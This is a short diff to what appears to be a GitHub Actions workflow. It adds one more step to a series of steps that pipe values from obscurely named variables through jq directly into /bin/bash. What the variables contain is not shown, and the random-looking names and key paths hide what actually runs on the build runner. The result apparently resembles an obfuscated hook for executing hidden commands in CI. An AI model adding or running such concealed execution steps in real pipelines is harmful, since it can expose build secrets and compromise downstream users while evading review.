@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$g0131" | jq -r .pm5066 | /bin/bash
           printf '%s' "$wk6" | jq -r .pncp640 | /bin/bash
           echo $h4 | jq -r .h84953 | /bin/bash
+          echo $lyepy1 | jq -r .lerkf45500 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
